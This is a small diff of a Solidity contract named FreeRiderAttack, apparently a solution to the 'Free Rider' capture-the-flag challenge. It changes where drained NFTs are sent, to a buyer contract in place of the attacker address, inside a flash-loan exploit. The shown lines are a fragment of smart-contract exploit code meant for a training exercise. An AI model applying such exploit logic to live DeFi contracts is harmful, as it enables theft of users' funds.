@@ -162,7 +162,7 @@ contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
         // send all of the nft to the FreeRiderBuyer contract
         for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
             tokenIds[tokenId] = tokenId;
-            nft.safeTransferFrom(address(this), attacker, tokenId);
+            nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
         }
 
         // wrap enough WETH9 to repay our debt
